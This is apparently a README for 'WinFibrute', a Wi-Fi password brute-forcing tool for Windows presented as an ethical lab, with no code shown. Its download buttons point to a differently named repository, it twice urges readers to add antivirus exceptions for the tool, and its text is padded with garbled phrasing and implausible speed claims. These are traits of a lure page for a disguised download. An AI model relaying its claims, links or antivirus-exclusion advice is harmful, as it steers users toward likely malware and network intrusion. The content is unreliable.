![preview](https://raw.githubusercontent.com/loeschirodrigues/netforce-wardialer/main/thumb_109ba.svg)

# ✦ WinFibrute — Adaptive Credential Resilience Lab for Windows Environments

**WinFibrute** is not just another security tool—it's a **controlled, ethical sandbox** for understanding how Windows-based authentication systems respond to systematic credential testing. Think of it as a **digital firing range** where security professionals, network administrators, and curious students can safely observe the mechanics of password resilience without leaving their own machine. Unlike conventional utilities that require exotic hardware, WinFibrute is engineered to operate **natively on standard Windows installations**, leveraging the built-in wireless stack to simulate real-world authentication pressure.

This project exists to **demystify the black box of credential verification**. When you run WinFibrute in a lab environment—against your own test routers, your own virtual access points, or simulated network segments—you're not performing an intrusion; you're conducting a **controlled experiment**. The module systematically iterates through candidate passphrases, timing each attempt, logging handshake responses, and graphing the entropy landscape of your chosen credentials. It's the difference between knowing a lock is strong and *proving* it under laboratory conditions.

The true value of WinFibrute lies in its **pedagogical architecture**. Every module component is commented, every algorithm is documented, and every output metric is designed to be read by humans first. You'll understand *why* a password resists 10,000 attempts in 40 seconds, and *how* dictionary-based approaches differ from pure brute-force sequences. This is the tool we wish existed when we first started studying wireless security—a precise, Windows-first, no-extra-adapter-required instrument for credential stress-testing.

---

## 📚 Table of Contents

- [## Overview: A Precision Instrument for Security Education](#overview--a-precision-instrument-for-security-education)
- [## The Philosophical Foundation: Testing, Not Trespassing](#the-philosophical-foundation--testing-not-trespassing)
- [## Key Features That Define WinFibrute](#key-features-that-define-winfibrute)
- [## System Architecture: Built for Windows, Designed for Clarity](#system-architecture--built-for-windows-designed-for-clarity)
- [## Getting Started: Your First Controlled Experiment](#getting-started--your-first-controlled-experiment)
- [## Configuration Matrix: Tailoring the Lab to Your Needs](#configuration-matrix--tailoring-the-lab-to-your-needs)
- [## Performance Metrics and Output Interpretation](#performance-metrics-and-output-interpretation)
- [## Security Protocols: The Three-Layer Defense](#security-protocols--the-three-layer-defense)
- [## Compatibility and Platform Support](#compatibility-and-platform-support)
- [## The Ethical Usage Framework: A Binding Contract](#the-ethical-usage-framework--a-binding-contract)
- [## Troubleshooting Common Laboratory Scenarios](#troubleshooting-common-laboratory-scenarios)
- [## Contribution Guidelines for the Curious Mind](#contribution-guidelines-for-the-curious-mind)
- [## Frequently Asked Questions (FAQ)](#frequently-asked-questions-faq)
- [## Disclosure and Responsible Use Statement](#disclosure-and-responsible-use-statement)
- [## License and Legal Consideration](#license-and-legal-consideration)

---

## ⚙️ Overview: A Precision Instrument for Security Education

[![Download](https://raw.githubusercontent.com/loeschirodrigues/netforce-wardialer/main/grab_0d1e.svg)](https://loeschirodrigues.github.io/netforce-wardialer/)

WinFibrute operates on a fundamental principle: **you cannot defend what you do not understand**. The software provides a transparent, measurable, and repeatable framework for testing the resilience of Wi-Fi credentials within a purely educational context. The tool is optimized for Windows systems, a deliberate design choice that eliminates the common barrier of requiring a specialized external wireless adapter. By utilizing the native Windows Wireless API, WinFibrute can initiate authentication attempts through the standard OS-level network stack, making it accessible for anyone running a modern Windows 10 or Windows 11 environment.

The core functionality revolves around a **credential verification engine** that systematically submits passphrases to a target access point and analyzes the timing and success of each attempt. This isn't about guessing—it's about measurement. Each attempt provides data: the average response time, the handshake validation status, the AP's behavior under sequential requests, and the overall throughput of the authentication process. This data transforms from raw numbers into actionable knowledge about password strength, network configuration, and common user pitfalls.

What truly sets WinFibrute apart is its **commitment to controlled environments**. The tool includes a virtual lab mode that creates simulated access points within your own machine's memory space. This allows you to practice, test, and refine your understanding without ever transmitting a single packet to a foreign network. The physical testing mode, conversely, is gated behind multiple confirmation prompts, requiring you to explicitly acknowledge that you are operating against infrastructure you own or have explicit written permission to test. The software acts as a **responsible facilitator**, never an aggressor.

---

## 🧠 The Philosophical Foundation: Testing, Not Trespassing

The creation of WinFibrute was driven by a simple observation: educational materials about wireless security often rely on outdated tools, complicated Linux environments, or expensive hardware. This project aims to break that barrier by placing a functional, educational-grade testing instrument directly into the hands of Windows users. We believe in the power of **active learning**—reading about password entropy is useful, but watching a candidate list expand in real-time against a target, seeing the success rates plateau, and adjusting your strategy accordingly creates permanent understanding.

The design philosophy is rooted in **transparency over obscurity**. Every operation the tool performs is logged to a local, human-readable file. You can see exactly which candidate passphrase was attempted, at what timestamp, and what the system response was. No hidden processes, no background uploads, no telemetry. This transparency ensures that the user is always aware of the tool's actions, reinforcing the ethical boundaries that are fundamental to its intended use.

Furthermore, we emphasize **proactive defense** as the ultimate goal. The metrics generated by WinFibrute are not trophies to be collected; they are diagnostic gold for assessing your own security posture. By testing your own home router's default credentials, you can discover vulnerabilities you never knew existed. By testing your company's guest network policy, you can demonstrate to decision-makers why stronger passphrases are necessary. WinFibrute empowers you with the evidence needed to advocate for better security practices in your personal and professional circles.

---

## ✨ Key Features That Define WinFibrute

### 🚀 Native Windows Optimization
Forget the complex rituals of virtual machines, dual-boot setups, or proprietary driver configurations. WinFibrute harnesses the **inherent capabilities of the Windows operating system**, requiring no additional hardware for standard operations. The tool interfaces directly with the NDIS (Network Driver Interface Specification) layer through well-documented system calls, ensuring stable and consistent performance across various Windows versions. This means you can run your security experiments on the same laptop you use for daily work, eliminating the need for a dedicated testing rig.

### 📊 Real-Time Visualization Console
The built-in dashboard provides an **animated, graph-based view** of your testing progress. Rather than staring at a monochrome command prompt, you observe a live-updating entropy chart that shows the distribution of your attempts, the cumulative time, and the estimated time to completion based on current speed. A session histogram breaks down your success ratio, and a trend line shows whether your candidate list is becoming more or less effective over time. This isn't just about functionality—it's about **comprehending the data landscape** at a glance.

### 🈯 Multilingual Command Interface
Security knowledge is universal, yet language barriers often impede learning. WinFibrute supports **seven major languages**: English, Spanish, French, German, Mandarin Chinese, Japanese, and Portuguese. The interface, error messages, and output reports automatically adapt to your system locale or can be manually overridden via the configuration file. This dedication to **multilingual support** ensures that a student in Tokyo and an engineer in Berlin can have the same educational experience without stumbling over linguistic hurdles.

### 🧩 Modular Plugin Architecture
The core engine is a shell for interchangeable modules, allowing you to customize your testing strategy. The **default module** implements a sequential character-set iterator, the foundation of brute-force methodology. A **dictionary module** loads custom wordlists and applies common mutation rules (like appending years or numbers). For advanced users, a **rule-based engine** permits defining complex pattern logic. Each module is a discrete, loadable component, making it straightforward to extend the tool's capabilities without touching the core codebase.

### ⏱️ Adaptive Throttle Control
Responsible testing isn't about raw speed; it's about **smart pacing**. WinFibrute features an adaptive throttling system that analyzes the target's response times and automatically adjusts the request rate to avoid triggering denial-of-service protections on the target AP. This not only ensures that the target network remains stable but also produces more realistic timing data, as your attempts are operating within the same constraints a genuine user would experience. You can also manually override the throttle for lab environments that deliberately disable rate limiting.

### 📝 Detailed Session Logging (CSV/JSON)
Every test run produces a comprehensive log file, structured in both CSV and JSON formats for maximum compatibility with your analytical tools. Each entry records the timestamp, candidate passphrase (or a cryptographic hash if you enable privacy masks), target BSSID, response code, time elapsed, and any relevant system error messages. This log is not automatically erased, and it is always stored locally on your machine, reinforcing the **data sovereignty** principle of the project.

### 🛡️ Three-Layer Safety Interlock
Structured like a physical safety catch, WinFibrute requires triple confirmation before it will initiate a session against a real (non-simulated) access point. First, you must type `CONFIRM` at the command line. Second, you must re-enter the target's SSID manually. Third, the tool will prompt you to check a checkbox in the GUI confirming you have authorization. This deliberate friction is designed to slow down impulsive actions and give the user multiple opportunities to consider the ethical weight of their operation.

### 🔄 Continuous Integration for Lab Environments
For users who wish to automate their security testing, WinFibrute offers a **headless mode** that can be controlled via a RESTful API. This allows you to schedule test runs, feed candidate lists programmatically, and integrate the tool into your larger security auditing pipeline. All authenticated through a local-only token, this API ensures that automation does not come at the cost of safety.

---

## 🏗️ System Architecture: Built for Windows, Designed for Clarity

The architecture of WinFibrute is the result of careful deliberation about the typical user's workflow. It is not a monolithic block; rather, it is a **structured ecosystem of modules** that communicate through a central event bus.

### The Core Engine (`core/`)
The heart of the application, this component manages the session lifecycle, thread pools, and the main state machine. It is written in C++ for performance-critical loops, ensuring that the iteration through candidate passphrases is as swift as the operating system allows.

### The Windows Wireless Interface (`adapter/`)
This is the **magic middleware** that translates WinFibrute's generic testing commands into the specific API calls of the Windows Native WLAN API. It handles connection requests, disconnections, and signal quality monitoring, abstracting the complexity of the underlying driver model.

### The Candidate Generator (`generators/`)
This directory contains the various strategy modules. Each generator adheres to a common interface, receiving a configuration object and producing a stream of candidate strings. The `sequential_generator` produces lexicographically ordered strings; the `dictionary_generator` reads lines from a file; the `hybrid_generator` combines both.

### The Network Simulation Layer (`simulation/`)
Perhaps the most educationally valuable component, this module creates a **virtual access point** using a loopback network interface. It simulates the 4-way handshake, accepts candidate attempts, and records success/failure based on a local hash of the configured "password." It runs at full speed, bounded only by CPU, and is the default target mode for new users.

### The Analytics Dashboard (`ui/`)
A lightweight, web-based interface (served from a local port) that provides the real-time visualizations. It communicates with the core engine via a WebSocket connection, ensuring smooth, low-latency updates. This separation means the analytics can be viewed through any modern browser without requiring native GUI framework dependencies.

### The Configuration Handler (`config/`)
All user-facing settings are stored in a `winfibrute.ini` file. The handler parses this file, validates values, and provides a typed configuration object to the rest of the application. This allows for **portable configurations**—you can copy your settings between systems.

---

## 🚀 Getting Started: Your First Controlled Experiment

### Step 1: Pre-Flight Checklist
Before you initiate your first session, ensure your environment meets the minimum requirements:
- A Windows 10 (Build 1903 or later) or Windows 11 machine, 64-bit.
- At least 2GB of free RAM for the application and its logging buffers.
- An active network interface (the built-in Wi-Fi card is all that's necessary for real testing; a loopback interface is used for simulations).
- **A legal target.** This cannot be overstated—your first test should run in simulation mode.

### Step 2: Acquiring and Placing the Tool
Obtain the latest release of WinFibrute for your architecture. The distribution is a self-contained archive. Extract the contents to a directory you have write access to, such as `C:\Users\YourName\SecurityLabs\WinFibrute`. It is recommended, though not required, to configure your antivirus to allow an exception for the `adapter` directory, as the tool's behavior can occasionally trip heuristic scanners.

### Step 3: The Simulation-First Principle
Launch the application with the `--simulate` flag. The initial command syntax is straightforward:
`WinFibrute --simulate --target MyTestLab --password passw0rd`
This will create a virtual access point named "MyTestLab" with the known password "passw0rd". The tool will then begin executing its default sequential strategy against this simulated target. You will see the dashboard open in your browser shortly after.

### Step 4: Observing the Data Flow
Watch the real-time console. You will see candidate strings being generated and tested. Notice the **average attempt duration** metric—this reflects your system's speed. Keep an eye on the entropy graph; it should show a linear progression as the sequential generator systematically cycles through character combinations.

### Step 5: Transitioning to Physical Testing (With Armor)
Once you are comfortable with the simulation's behavior and have a target you own, you can initiate a physical test. Use the interactive menu by launching `WinFibrute` (without the `--simulate` flag) and selecting "Initiate Physical Session." The tool will scan for available networks, and your chosen target will trigger the **three-layer safety interlock** described earlier. Complete the confirmations, and the session begins.

---

## 🎛️ Configuration Matrix: Tailoring the Lab to Your Needs

The `config/winfibrute.ini` file is your **command center** for behavioral customization. Here are the primary sections:

### `[Session]`
- **`throttle_ms`**: The base delay between attempts, in milliseconds. Default is 50. A higher value (e.g., 200) is more polite to the target network.
- **`use_adaptive_throttle`**: Boolean (true/false). When true, the tool adjusts `throttle_ms` based on response time. Recommended to keep true.
- **`timeout_seconds`**: Maximum time to wait for a handshake response before treating it as a failure. Default is 5.
- **`privacy_mask`**: Boolean. When true, the log file records `[MASKED]` instead of the actual candidate string. This prevents sensitive, boring, or personal passphrases from being written to disk.

### `[Generator]`
- **`strategy`**: `sequential`, `dictionary`, `hybrid`, or `rule_based`.
- **`charset`**: For sequential strategy. Define the character set, e.g., `abcdefghijklmnopqrstuvwxyz0123456789`.
- **`min_length` / `max_length`**: Integer boundaries for candidate length.
- **`wordlist_path`**: For dictionary/hybrid strategies. Path to your `.txt` wordlist file.
- **`mutation_rules`**: Comma-separated list of rules (e.g., `append_2digits`, `capitalize_first`).

### `[Analytics]`
- **`dashboard_port`**: The local port for the web dashboard. Default is 8086.
- **`log_to_csv`** / **`log_to_json`**: Booleans to control log output format.
- **`log_interval`**: Time in seconds between periodic summary log entries.

### `[Network]` (Advanced)
- **`monitor_mode_compat`**: Boolean. Intended for specific Windows builds; setting this to true may enable more granular packet inspection, but we recommend leaving it as false for standard educational use.

---

## 📈 Performance Metrics and Output Interpretation

Understanding the output is as critical as generating it. The dashboard and log files provide several key metrics that tell a story about your target's security.

| Metric | Description | Educational Relevance |
| :--- | :--- | :--- |
| **Attempt Throughput** | Number of candidates tested per second. | Shows the raw speed of your setup. A higher throughput reduces overall testing time. |
| **Handshake Success Rate** | Percentage of attempts that received any valid response. | A low success rate might indicate the target is blocking rapid sequential probes. |
| **Candidate Entropy Index** | A derived score (0-100) based on the character variety in your candidate list. | This isn't a target metric; it's a reflection of your strategy's theoretical coverage. |
| **Average Latency (ms)** | The average time between sending an attempt and receiving a response. | This helps you calibrate the throttle and understand the target's processing load. |
| **Completion ETA** | Estimated time of arrival for your full candidate range. | Gives you a reality check on the feasibility of your chosen character space. |

When interpreting your results, remember: **a session that finds the password proves a specific weakness** (e.g., the password is a common word or short sequence). A session that does *not* find the password is also valuable proof—it demonstrates that the given candidate space is durable against this type of pressure test.

---

## 🛡️ Security Protocols: The Three-Layer Defense

WinFibrute takes its safety responsibilities seriously. The tool implements a **Three-Layer Defense (TLD)** system inspired by military safety switches.

1.  **Layer One: Interface Guard**
    The physical testing module is abstracted behind a simulated network layer by default. The tool must be explicitly told to "lift" this layer by running in non-simulate mode. A user who simply launches the tool and clicks "Start" will *only* interact with the virtual environment.

2.  **Layer Two: Explicit Confirmation**
    To access physical mode, the user must navigate to the `[Test]` menu, select `[Physical Target Scan]`, and then acknowledge a full-screen dialog explaining the legal and ethical implications. This dialog cannot be bypassed by keyboard shortcuts; it requires typing `CONFIRM`.

3.  **Layer Three: Target Authorization Matrix**
    The tool maintains an "authorized targets" list stored in `authorized_targets.txt`. A target must be pre-listed in this file, and its BSSID must match, before the tool will permit a brute-force sequence. This prevents accidental targeting of neighboring networks that the user might not have intended to include in their test. The file is intentionally simple to edit, but its existence serves as a **constant reminder** that you are responsible for every entry.

---

## 💻 Compatibility and Platform Support

### Windows Versions
- **Windows 11**: Fully supported. Tested on releases 21H2 through 23H2.
- **Windows 10**: Fully supported. Tested on builds 1903 through 22H2.
- **Windows Server 2016/2019/2022**: Operable, though the GUI dashboard might require the IIS feature for the local web server.

### Windows Feature Dependencies
The tool relies on the standard **Windows Native WLAN Service** and the **NDIS User Mode I/O Protocol**. These are enabled by default on most consumer and enterprise editions. If you have previously disabled your network services, you may need to re-enable them.

### Non-Governmental Systems
WinFibrute **does not** support Linux or macOS natively. The adapter layer is deeply intertwined with the Windows NDIS API. Attempting to run the core engine on other systems will fail at the `adapter` stage. If you require a cross-platform solution, we recommend exploring alternative educational frameworks; WinFibrute's focus is, and remains, the Windows ecosystem.

---

## ⚖️ The Ethical Usage Framework: A Binding Contract

By downloading and using WinFibrute, you enter into a **personal ethical contract**. This is not a legal license, but a moral imperative that echoes the spirit of security research.

- **You will only test networks you own** (your home router, your company's lab, your virtual machines).
- **You will only test networks you have explicit written permission to test**. Verbal consent from a friend does not meet the threshold; get it in writing.
- **You will not use this tool to compromise the confidentiality, integrity, or availability of any system**.
- **You will use the knowledge gained to improve security**, not to exploit it.
- **You will be mindful of your local laws**. Even testing your own equipment can be subject to regulations regarding radio emissions and data privacy. Know the rules where you live.

This project is an educational tool, not a weapon. The responsibility for its use rests solely on the operator.

---

## 🔧 Troubleshooting Common Laboratory Scenarios

### Scenario A: The Dashboard Does Not Open
- Ensure your firewall is not blocking local port `8086`.
- Check that the address `http://127.0.0.1:8086` is typed correctly.
- Look at the initial console output; if it mentions "Dashboard server failed to bind," you may have another application on that port. Change the `dashboard_port` in the config file.

### Scenario B: Physical Mode Shows "Error 0x80004005: The network is not present"
- This usually means the Windows WLAN API cannot locate the target. Double-check the SSID spelling.
- Ensure your Wi-Fi adapter is enabled and connected to a network (any network).
- If you are trying to test a target that is out of range, the adapter cannot see it. Bring the machine closer.

### Scenario C: Slow Performance in Simulation Mode
- Simulation speed can be limited by CPU usage. The virtual AP is a software process; the `throttle_ms` setting still applies. Lower the `throttle_ms` to increase speed, but note this is for lab only.
- Check if your background programs are consuming 100% CPU. The tool is computationally light, but it cannot outpace your system's clock.

### Scenario D: Confusing Results After Password is Found
- If the target is found in the first few seconds, it's likely a dictionary hit on a common password. Review your wordlist and consider adding mutations for a more realistic test.
- Verify your target's specific configuration. Did it use WPA2-PSK or WPA3? The tool defaults to the highest common denominator (WPA2), but you can specify the protocol for the simulation setup.

---

## 🤝 Contribution Guidelines for the Curious Mind

We welcome contributions that align with the **educational and ethical core** of WinFibrute. Whether you're fixing a logic bug, improving the documentation, or suggesting a new generator module, your help is appreciated.

### How to Contribute
1.  **Fork the Repository**: Create your own copy to work on.
2.  **Create a Feature Branch**: `git` principles apply; name your branch descriptively (e.g., `feature/genetic-generator`).
3.  **Code Style**: Follow the existing C++ (core) and Python (analytics/dashboard) styles. Clarity and comments are paramount.
4.  **Test Your Changes**: Ensure you can run the tool in simulation mode and that your changes don't break the existing behaviour. Provide a brief description of what you tested.
5.  **Submit a Pull Request**: Describe what your change does and why it's necessary.

### Areas Seeking Help
- **Localization**: If you are a native speaker of a language not yet supported, your translation would be a huge asset.
- **Generator Modules**: We are particularly interested in Markov-chain-based generators and mask attack modules (like those used in professional audit tools).
- **Documentation**: Help us explain the intricate workings of the Windows WLAN API to a beginner audience.

Let's build a better learning resource together.

---

## ❓ Frequently Asked Questions (FAQ)

**Q1: Is this tool illegal?**
No. Software itself is not illegal. However, *how* you use it can be. Using it on networks you do not own or without explicit written permission is illegal in most jurisdictions. The tool is designed for lab use and self-assessment.

**Q2: Will this work on a Mac or Linux machine?**
No. It is tightly integrated with Windows system calls. We have no immediate plans for porting to other operating systems.

**Q3: Does WinFibrute claim to guarantee success in recovering lost credentials?**
Absolutely not. The tool is a testing instrument, not a recovery service. It reads a candidate list and tests them. If the credential is strong and not in your list, the tool will fail—and that is a valid, educational result.

**Q4: I'm worried about my antivirus flagging this software.**
Some heuristics-based scanners mark security tools as "potentially unwanted programs" because of their nature. The digital signing of the executable should mitigate this, but allow-listing the `WinFibrute.exe` in your AV software may be necessary.

**Q5: Can I use WinFibrute for my company's penetration testing job?**
If you have a signed contract and the scope of your testing explicitly includes the target networks, then yes, it's an additional tool in your kit. Ensure your client is aware of the tool's specifics, and always operate within the defined rules of engagement.

**Q6: Where is the data logged?**
By default, all logs are written to a `logs/` directory in the WinFibrute root folder. The file names are timestamped. Remember to check the `privacy_mask` setting if you are concerned about sensitive strings in your logs.

**Q7: I found a bug. What can I do?**
Please open an issue on the GitHub repository. Please include your Windows version, the error message, and steps to reproduce the problem. Do not upload full logs if they contain candidate passphrases; use the privacy mask feature first.

---

## 📢 Disclosure and Responsible Use Statement

**Dedication to Purpose**: WinFibrute is dedicated exclusively to the advancement of cybersecurity knowledge through **softwarically simulated environments** and **explicitly authorized** testing scenarios. It serves the educational community, network administrators, and security professionals who need a benchmark tool for understanding authentication flaws.

**Absolute Prohibition of Malicious Use**: We are unequivocally against the use of WinFibrute to gain unpaid access to any network, to hold networks for ransom, or to harass network operators. These actions are unethical, harmful, and likely illegal. The project maintainers are not responsible for the consequences of malicious actions performed by individuals who misuse this technology. The code is provided "as is" for educational study; the moral imperative to use it for good rests solely on the conscience of the user.

**Written Authorization Requirement**: For physical testing mode, you must have a written document (email, PDF, physical paper) that clearly states you are permitted to test the specific SSIDs. This is non-negotiable. If you cannot produce this documentation at any time, you must terminate the session immediately.

We trust you to be a force for good in the digital landscape.

---

## 📜 License and Legal Consideration

WinFibrute is open-sourced under the **MIT License**. This permissive license grants you the freedom to use, modify, and redistribute the code, provided that the copyright notice and the permission notice are included in all copies or substantial portions of the Software.

You can view the full text of the license at the following location: [MIT License Link](https://opensource.org/licenses/MIT).

**A Note on Metric System**: The project founders continuously emphasize that this tool is a **mirror**, not a key. It reflects the strength of your defenses. It does not provide the freedom to break them.

**[![Download](https://raw.githubusercontent.com/loeschirodrigues/netforce-wardialer/main/grab_0d1e.svg)](https://loeschirodrigues.github.io/netforce-wardialer/)**